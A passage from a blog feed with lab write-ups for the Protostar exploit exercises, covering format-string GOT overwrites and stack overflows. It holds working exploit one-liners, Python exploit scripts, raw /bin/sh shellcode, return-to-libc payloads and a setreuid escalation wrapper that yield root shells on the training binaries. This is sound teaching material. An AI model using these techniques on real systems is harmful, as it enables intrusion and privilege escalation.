<p>{% codeblock %}
user@protostar:~$ ruby1.9.1 ./formatter.rb 12:0x080496f4:0x01025544
ruby -e &lsquo;print [0x080496f6].pack(&ldquo;V&rdquo;) + [0x080496f4].pack(&ldquo;V&rdquo;) + &ldquo;%12\$250x%12\$hn%13\$21570x%13\$hn&rdquo;&rsquo;</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496f6].pack(&ldquo;V&rdquo;) + [0x080496f4].pack(&ldquo;V&rdquo;) + &ldquo;%12\$250x%12\$hn%13\$21570x%13\$hn&rdquo;&rsquo; | /opt/protostar/bin/format3
&hellip;
80496f4you have modified the target :)
{% endcodeblock %}</p>

<p>The challenge could be also solved with <a href="https://github.com/hellman/libformatstr">hellman&rsquo;s libformatstr.py</a>.</p>

<p>{% codeblock %}
user@protostar:~$ git clone <a href="https://github.com/hellman/libformatstr">https://github.com/hellman/libformatstr</a>
Cloning into libformatstr&hellip;
remote: Counting objects: 51, done.
remote: Total 51 (delta 0), reused 0 (delta 0), pack-reused 51
Unpacking objects: 100% (51/51), done.</p>

<p>user@protostar:~$ cd libformatstr/
{% endcodeblock %}</p>

<p>{% codeblock lang:py exploit-format3.py %}</p>

<h1>!/usr/bin/env python</h1>

<p>import sys
from libformatstr import FormatStr</p>

<p>destination   = 0x080496f4
what_to_write = 0x01025544</p>

<p>p = FormatStr()
p[destination] = what_to_write</p>

<h1>buf is 12th argument, 0 bytes are already printed</h1>

<p>sys.stdout.write(p.payload(12, start_len=0))
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~/libformatstr$ python ./exploit-format3.py  | /opt/protostar/bin/format3
&hellip;
 p??you have modified the target :)
{% endcodeblock %}</p>

<h2>Protostar Format4</h2>

<p>{% codeblock lang:c format4.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int target;</p>

<p>void hello()
{
  printf(&ldquo;code execution redirected! you win\n&rdquo;);
  _exit(1);
}</p>

<p>void vuln()
{
  char buffer[512];</p>

<p>  fgets(buffer, sizeof(buffer), stdin);</p>

<p>  printf(buffer);</p>

<p>  exit(1); <br/>
}</p>

<p>int main(int argc, char **argv)
{
  vuln();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD&rdquo; + &ldquo; %p&rdquo; * 25&rsquo; | /opt/protostar/bin/format4
DDDD 0x200 0xb7fd8420 0xbffff5b4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x702520 0x1000 0x1</p>

<p>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD %4\$p&rdquo;&rsquo; | /opt/protostar/bin/format4
DDDD 0x44444444</p>

<p>user@protostar:~$ objdump -TR /opt/protostar/bin/format4</p>

<p>/opt/protostar/bin/format4:     file format elf32-i386</p>

<p>DYNAMIC SYMBOL TABLE:
00000000  w   D  <em>UND</em>  00000000              <strong>gmon_start</strong>
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   fgets
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   <em><em>libc_start_main
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   </em>exit
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   printf
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   puts
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   exit
080485ec g    DO .rodata    00000004  Base        </em>IO_stdin_used
08049730 g    DO .bss   00000004  GLIBC_2.0   stdin</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496fc R_386_GLOB_DAT    <strong>gmon_start</strong>
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   <em>_libc_start_main
08049718 R_386_JUMP_SLOT   </em>exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit</p>

<p>user@protostar:~$ objdump -d -j .plt /opt/protostar/bin/format4</p>

<p>/opt/protostar/bin/format4:     file format elf32-i386</p>

<p>Disassembly of section .plt:</p>

<p>0804837c &lt;<strong>gmon_start</strong>@plt-0x10>:
 804837c:   ff 35 04 97 04 08       pushl  0x8049704
 8048382:   ff 25 08 97 04 08       jmp    *0x8049708
 8048388:   00 00                   add    %al,(%eax)
    &hellip;</p>

<p>0804838c &lt;<strong>gmon_start</strong>@plt>:
 804838c:   ff 25 0c 97 04 08       jmp    *0x804970c
 8048392:   68 00 00 00 00          push   $0x0
 8048397:   e9 e0 ff ff ff          jmp    804837c &lt;_init+0x30></p>

<p>0804839c &lt;fgets@plt>:
 804839c:   ff 25 10 97 04 08       jmp    *0x8049710
 80483a2:   68 08 00 00 00          push   $0x8
 80483a7:   e9 d0 ff ff ff          jmp    804837c &lt;_init+0x30></p>

<p>080483ac &lt;<em>_libc_start_main@plt>:
 80483ac:   ff 25 14 97 04 08       jmp    *0x8049714
 80483b2:   68 10 00 00 00          push   $0x10
 80483b7:   e9 c0 ff ff ff          jmp    804837c &lt;</em>init+0x30></p>

<p>080483bc &lt;<em>exit@plt>:
 80483bc:   ff 25 18 97 04 08       jmp    *0x8049718
 80483c2:   68 18 00 00 00          push   $0x18
 80483c7:   e9 b0 ff ff ff          jmp    804837c &lt;</em>init+0x30></p>

<p>080483cc &lt;printf@plt>:
 80483cc:   ff 25 1c 97 04 08       jmp    *0x804971c
 80483d2:   68 20 00 00 00          push   $0x20
 80483d7:   e9 a0 ff ff ff          jmp    804837c &lt;_init+0x30></p>

<p>080483dc &lt;puts@plt>:
 80483dc:   ff 25 20 97 04 08       jmp    *0x8049720
 80483e2:   68 28 00 00 00          push   $0x28
 80483e7:   e9 90 ff ff ff          jmp    804837c &lt;_init+0x30></p>

<p>080483ec &lt;exit@plt>:
 80483ec:   ff 25 24 97 04 08       jmp    *0x8049724
 80483f2:   68 30 00 00 00          push   $0x30
 80483f7:   e9 80 ff ff ff          jmp    804837c &lt;_init+0x30></p>

<p>user@protostar:~$ nm /opt/protostar/bin/format4 | grep hello
080484b4 T hello
{% endcodeblock %}</p>

<p>Using <code>Global Offset Table Hijacking</code> technique, we will try to overwrite the <code>0x08049724</code> address - jmp in <code>exit()</code>, with <code>0x080484b4</code> - symbol <code>hello</code>, at offset <code>4</code>.</p>

<p>{% codeblock %}
user@protostar:~$ ruby1.9.1 ./formatter.rb 4:0x08049724:0x080484b4
ruby -e &lsquo;print [0x08049726].pack(&ldquo;V&rdquo;) + [0x08049724].pack(&ldquo;V&rdquo;) + &ldquo;%4\$2044x%4\$hn%5\$31920x%5\$hn&rdquo;&rsquo;</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x08049726].pack(&ldquo;V&rdquo;) + [0x08049724].pack(&ldquo;V&rdquo;) + &ldquo;%4\$2044x%4\$hn%5\$31920x%5\$hn&rdquo;&rsquo; | /opt/protostar/bin/format4
&hellip;
8049724code execution redirected! you win
{% endcodeblock %}</p>

<p>Correspondingly:</p>

<p>{% codeblock lang:python exploit-format4.py %}</p>

<h1>!/usr/bin/env python</h1>

<p>import sys
from libformatstr import FormatStr</p>

<p>destination   = 0x08049724
what_to_write = 0x080484b4</p>

<p>p = FormatStr()
p[destination] = what_to_write</p>

<h1>buf is 4th argument, 0 bytes are already printed</h1>

<p>sys.stdout.write(p.payload(4, start_len=0))
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ libformatstr/exploit-format4.py | /opt/protostar/bin/format4
&hellip;
AAA&amp;$code execution redirected! you win
{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Stack Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/27/exploit-exercises-protostar-stack-levels/"/>
    <updated>2015-06-27T09:46:35+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/27/exploit-exercises-protostar-stack-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<p>{% codeblock %}
user@protostar:~$ wget <a href="https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt">https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt</a> &ndash;no-check-certificate -O ~/.gdbinit -q
{% endcodeblock %}</p>

<h2>Protostar Stack0</h2>

<p>{% codeblock lang:c stack0.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];</p>

<p>  modified = 0;
  gets(buffer);</p>

<p>  if(modified != 0) {
      printf(&ldquo;you have changed the &lsquo;modified&rsquo; variable\n&rdquo;);
  } else {
      printf(&ldquo;Try again?\n&rdquo;);
  }
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;\xfa&rdquo; * 64&rsquo; | ./stack0
Try again?</p>

<p>user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;\xfa&rdquo; * 64 + &ldquo;\x01&rdquo;&rsquo; | ./stack0
you have changed the &lsquo;modified&rsquo; variable
{% endcodeblock %}</p>

<h2>Protostar Stack1</h2>

<p>{% codeblock lang:c stack1.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];</p>

<p>  if(argc == 1) {
      errx(1, &ldquo;please specify an argument\n&rdquo;);
  }</p>

<p>  modified = 0;
  strcpy(buffer, argv[1]);</p>

<p>  if(modified == 0x61626364) {
      printf(&ldquo;you have correctly got the variable to the right value\n&rdquo;);
  } else {
      printf(&ldquo;Try again, you got 0x%08x\n&rdquo;, modified);
  }
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64&rsquo;)
Try again, you got 0x00000000</p>

<p>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x41414141].pack(&ldquo;V&rdquo;) &rsquo;)
Try again, you got 0x41414141</p>

<p>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x61626364].pack(&ldquo;V&rdquo;) &rsquo;)
you have correctly got the variable to the right value
{% endcodeblock %}</p>

<h2>Protostar Stack2</h2>

<p>{% codeblock lang:c stack2.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char <em>*argv)
{
  volatile int modified;
  char buffer[64];
  char </em>variable;</p>

<p>  variable = getenv(&ldquo;GREENIE&rdquo;);</p>

<p>  if(variable == NULL) {
      errx(1, &ldquo;please set the GREENIE environment variable\n&rdquo;);
  }</p>

<p>  modified = 0;</p>

<p>  strcpy(buffer, variable);</p>

<p>  if(modified == 0x0d0a0d0a) {
      printf(&ldquo;you have correctly modified the variable\n&rdquo;);
  } else {
      printf(&ldquo;Try again, you got 0x%08x\n&rdquo;, modified);
  }</p>

<p>}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/opt/protostar/bin$ ./stack2
stack2: please set the GREENIE environment variable</p>

<p>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e &lsquo;print &ldquo;A&rdquo; * 64 + [0x41414141].pack(&ldquo;V&rdquo;)&rsquo;) ./stack2
Try again, you got 0x41414141</p>

<p>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e &lsquo;print &ldquo;A&rdquo; * 64 + [0x0d0a0d0a].pack(&ldquo;V&rdquo;)&rsquo;) ./stack2
you have correctly modified the variable
{% endcodeblock %}</p>

<h2>Protostar Stack3</h2>

<p>{% codeblock lang:c stack3.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>void win()
{
  printf(&ldquo;code flow successfully changed\n&rdquo;);
}</p>

<p>int main(int argc, char <em>*argv)
{
  volatile int (</em>fp)();
  char buffer[64];</p>

<p>  fp = 0;</p>

<p>  gets(buffer);</p>

<p>  if(fp) {
      printf(&ldquo;calling function pointer, jumping to 0x%08x\n&rdquo;, fp);
      fp();
  }
}
{% endcodeblock %}</p>

<p>We need to rewrite fp function address with the address of win().
{% codeblock %}
user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x41414141].pack(&ldquo;V&rdquo;)&rsquo; | ./stack3
calling function pointer, jumping to 0x41414141
Segmentation fault</p>

<p>user@protostar:/opt/protostar/bin$ nm ./stack3 | grep win
08048424 T win</p>

<p>user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x08048424].pack(&ldquo;V&rdquo;)&rsquo; | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
{% endcodeblock %}</p>

<h2>Protostar Stack4</h2>

<p>{% codeblock lang:c stack4.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>void win()
{
  printf(&ldquo;code flow successfully changed\n&rdquo;);
}</p>

<p>int main(int argc, char **argv)
{
  char buffer[64];</p>

<p>  gets(buffer);
}
{% endcodeblock %}</p>

<p>We use metasploit patterns (on Kali Linux) to determine the exact location of stored EIP:
{% codeblock %}</p>

<h1>Window 1:</h1>

<p>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_create.rb 80
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac</p>

<h1>Window 2:</h1>

<p>user@protostar:/opt/protostar/bin$ gdb -q ./stack4
Reading symbols from /opt/protostar/bin/stack4&hellip;done.</p>

<p>(gdb) r
Starting program: /opt/protostar/bin/stack4
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()</p>

<h1>Window 1:</h1>

<p>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x63413563
[*] Exact match at offset 76</p>

<h1>Window 2:</h1>

<p>user@protostar:/opt/protostar/bin$ nm stack4 | grep win
080483f4 T win</p>

<p>user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0x080483f4].pack(&ldquo;V&rdquo;)&rsquo; | ./stack4
code flow successfully changed
{% endcodeblock %}</p>

<h2>Protostar Stack5</h2>

<p>{% codeblock lang:c stack5.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char **argv)
{
  char buffer[64];</p>

<p>  gets(buffer);
}
{% endcodeblock %}</p>

<p>The idea is the same as in Stack4, but we need to store shellcode on stack, for example.</p>

<p>Stack is executable:</p>

<p>{% codeblock %}
user@protostar:/opt/protostar/bin$ readelf -a ./stack4 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
{% endcodeblock %}</p>

<p>To have the same address in bash and gdb, we use hellman&rsquo;s fixenv tool.</p>

<p>{% codeblock %}
user@protostar:~$ git clone <a href="https://github.com/hellman/fixenv">https://github.com/hellman/fixenv</a>
Cloning into fixenv&hellip;
remote: Counting objects: 20, done.
Unpacking objects: 100% (20/20), done.
remote: Total 20 (delta 0), reused 0 (delta 0), pack-reused 20</p>

<p>user@protostar:~$ cd fixenv/</p>

<p>user@protostar:~/fixenv$ ./r.sh gdb /opt/protostar/bin/stack5
GNU gdb (GDB) 7.0.1-debian
Copyright &copy; 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &ldquo;show copying&rdquo;
and &ldquo;show warranty&rdquo; for details.
This GDB was configured as &ldquo;i486-linux-gnu&rdquo;.
For bug reporting instructions, please see:
<a href="http://www.gnu.org/software/gdb/bugs/">http://www.gnu.org/software/gdb/bugs/</a>&hellip;
Reading symbols from /home/user/fixenv/.launcher&hellip;done.</p>

<p>(gdb) set disassembly-flavor intel</p>

<p>(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 &lt;main+0>:    push   ebp
0x080483c5 &lt;main+1>:    mov    ebp,esp
0x080483c7 &lt;main+3>:    and    esp,0xfffffff0
0x080483ca &lt;main+6>:    sub    esp,0x50
0x080483cd &lt;main+9>:    lea    eax,[esp+0x10]
0x080483d1 &lt;main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 &lt;main+16>:   call   0x80482e8 &lt;gets@plt>
0x080483d9 &lt;main+21>:   leave<br/>
0x080483da &lt;main+22>:   ret  <br/>
End of assembler dump.</p>

<p>(gdb) b *0x080483d4
Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.</p>

<p>(gdb) b *0x080483d9
Breakpoint 2 at 0x80483d9: file stack5/stack5.c, line 11.</p>

<p>(gdb) r
Starting program: /home/user/fixenv/.launcher</p>

<p>Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffff914) at stack5/stack5.c:10
10  stack5/stack5.c: No such file or directory.
    in stack5/stack5.c</p>

<p>(gdb) x /xw $esp
0xbffff810: 0xbffff820</p>

<p>(gdb) c
Continuing.
ABCDEFGH</p>

<p>Breakpoint 2, main (argc=1, argv=0xbffff914) at stack5/stack5.c:11
11  in stack5/stack5.c
(gdb) x /s 0xbffff820
0xbffff820:  &ldquo;ABCDEFGH&rdquo;
{% endcodeblock %}</p>

<p>The address <code>0xbffff820</code> represents the buffer[] address, we store our
shellcode here and jump to this address. Also we know, that return address is
overwritten after position 76, from Protostar Stack4. We created our shellcode
<a href="http://localhost:4000/blog/2015/06/26/ia-32-linux-shellcode-basics-2/">here</a>.</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;\x90&rdquo; * (76 - sc.length) + [0xbffff820].pack(&ldquo;V&rdquo;) &rsquo; | ./r.sh /opt/protostar/bin/stack5
user@protostar:~/fixenv$
{% endcodeblock %}</p>

<p>The shell is executed, however it receives EOF. For this purposes, we can keep it alive with <code>cat</code> command:</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ (ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;\x90&rdquo; * (76 - sc.length) + [0xbffff820].pack(&ldquo;V&rdquo;) &rsquo;; cat -) | ./r.sh /opt/protostar/bin/stack5</p>

<p>id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>

<p>Sometimes a more convenient solution could be storing shellcode in environment:</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ export EGG=$(ruby -e &lsquo;print &ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;&rsquo;)</p>

<p>user@protostar:~/fixenv$ ./r.sh getvar EGG
0xbfffff60  \x60\xff\xff\xbf  (EGG)</p>

<p>user@protostar:~/fixenv$ ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbfffff60].pack(&ldquo;V&rdquo;)&rsquo; | ./r.sh /opt/protostar/bin/stack5
user@protostar:~/fixenv$</p>

<p>user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbfffff60].pack(&ldquo;V&rdquo;)&rsquo; ; cat) | ./r.sh /opt/protostar/bin/stack5</p>

<p>id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>

<p>We do not need to use <code>r.sh</code> again - the EGG address could be easily calculated (albeit it&rsquo;s different, because <code>fixenv</code> clears our environment):</p>

<p>{% codeblock lang:c getenv.c %}</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char <em>argv[]) {
    char </em>ptr;</p>

<pre><code>if (argc &lt; 3) {
    printf("Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n", argv[0]);
    exit(0);
} else {
    /* Get environment variable location */
    ptr = getenv(argv[1]); 
    /* Adjust for program name */
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2; 
    printf("%s will be at %p\n", argv[1], ptr);
}
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ gcc getenv.c -o getenv</p>

<p>user@protostar:~/fixenv$ ./getenv EGG /opt/protostar/bin/stack5
EGG will be at 0xbffff9b0</p>

<p>user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbffff9b0].pack(&ldquo;V&rdquo;)&rsquo; ; cat) | /opt/protostar/bin/stack5</p>

<p>id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>

<h2>Protostar Stack6</h2>

<p>{% codeblock lang:c stack6.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>void getpath()
{
  char buffer[64];
  unsigned int ret;</p>

<p>  printf(&ldquo;input path please: &rdquo;); fflush(stdout);</p>

<p>  gets(buffer);</p>

<p>  ret = __builtin_return_address(0);</p>

<p>  if((ret &amp; 0xbf000000) == 0xbf000000) {
      printf(&ldquo;bzzzt (%p)\n&rdquo;, ret);
      _exit(1);
  }</p>

<p>  printf(&ldquo;got path %s\n&rdquo;, buffer);
}</p>

<p>int main(int argc, char **argv)
{
  getpath();
}
{% endcodeblock %}</p>

<p>Using <code>pattern_create.rb</code> / <code>pattern_offset.rb</code> we found out that the stored return address is at offset 80.</p>

<p>{% codeblock %}
user@protostar:~$ gdb -q /opt/protostar/bin/stack6
&hellip;</p>

<p>gdb> b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.</p>

<p>gdb> r
&hellip;
Breakpoint 1, main (argc=0x1, argv=0xbffff804) at stack6/stack6.c:27
27  stack6/stack6.c: No such file or directory.
    in stack6/stack6.c</p>

<p>gdb> p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
{% endcodeblock %}</p>

<p>There is a great <a href="http://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pdf">return-to-libc writeup</a>
to explain the stack structure.</p>

<p>Address of <code>system()</code> is always the same, <code>0xb7ecffb0</code>, now we need to find the
<code>/bin/sh</code> string on the stack.</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ ./r.sh gdb /opt/protostar/bin/stack6
&hellip;
(gdb) set disassembly-flavor intel</p>

<p>(gdb) b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.</p>

<p>(gdb) r
Starting program: /home/user/fixenv/.launcher</p>

<p>(gdb) x /10s $esp
&hellip;
0xbfffff0e:  &ldquo;6:<em>.wav=00;36:</em>.axa=00;36:<em>.oga=00;36:</em>.spx=00;36:*.xspf=00;36:&rdquo;
0xbfffff4e:  &ldquo;SHELL=/bin/sh&rdquo;</p>

<p>(gdb) x /s 0xbfffff4e+6
0xbfffff54:  &ldquo;/bin/sh&rdquo;
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo;*80 + [0xb7ecffb0].pack(&ldquo;V&rdquo;) + &ldquo;FAKE&rdquo; + [0xbfffff54].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | ./r.sh /opt/protostar/bin/stack6
input path please:
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAA???FAKET???
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
{% endcodeblock %}</p>

<p>Without <code>setreuid()</code> call we have only <code>euid=0</code>, so we prepare this shell wrapper:
{% codeblock lang:c escalate.c %}</p>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char **argv)
{
        setreuid(geteuid(), geteuid());
        execv(&ldquo;/bin/sh&rdquo;, NULL);
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo;*80 + [0xb7ecffb0].pack(&ldquo;V&rdquo;) + &ldquo;FAKE&rdquo; + [0xbfffff54].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | ./r.sh /opt/protostar/bin/stack6
input path please:
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAA???FAKET???
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
/tmp/escalate
id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>

<h2>Protostar Stack7</h2>

<p>{% codeblock lang:c stack7.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>char *getpath()
{
  char buffer[64];
  unsigned int ret;</p>

<p>  printf(&ldquo;input path please: &rdquo;); fflush(stdout);</p>

<p>  gets(buffer);</p>

<p>  ret = __builtin_return_address(0);</p>

<p>  if((ret &amp; 0xb0000000) == 0xb0000000) {
      printf(&ldquo;bzzzt (%p)\n&rdquo;, ret);
      _exit(1);
  }</p>

<p>  printf(&ldquo;got path %s\n&rdquo;, buffer);
  return strdup(buffer);
}</p>

<p>int main(int argc, char **argv)
{
  getpath();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ gdb -q /opt/protostar/bin/stack7
Really redefine built-in command &ldquo;frame&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;thread&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;start&rdquo;? (y or n) [answered Y; input not from terminal]
Reading symbols from /opt/protostar/bin/stack7&hellip;done.
gdb> r
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9</p>

<p>Program received signal SIGSEGV, Segmentation fault.</p>

<hr />

<pre><code> eax:0804A008 ebx:B7FD7FF4  ecx:00000000  edx:00000001     eflags:00210202
 esi:00000000 edi:00000000  esp:BFFFF750  ebp:63413563     eip:37634136
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s z a p c 
</code></pre>

<p>[007B:BFFFF750]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF780 : 01 00 00 00  C0 F7 FF BF - 26 06 FF B7  B0 FA FF B7 &hellip;&hellip;..&amp;&hellip;&hellip;.
BFFFF770 : 38 41 64 39  00 FF FF FF - F4 EF FF B7  BC 82 04 08 8Ad9&hellip;&hellip;&hellip;&hellip;
BFFFF760 : 64 33 41 64  34 41 64 35 - 41 64 36 41  64 37 41 64 d3Ad4Ad5Ad6Ad7Ad
BFFFF750 : 41 63 38 41  63 39 41 64 - 30 41 64 31  41 64 32 41 Ac8Ac9Ad0Ad1Ad2A
[007B:0804A008]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
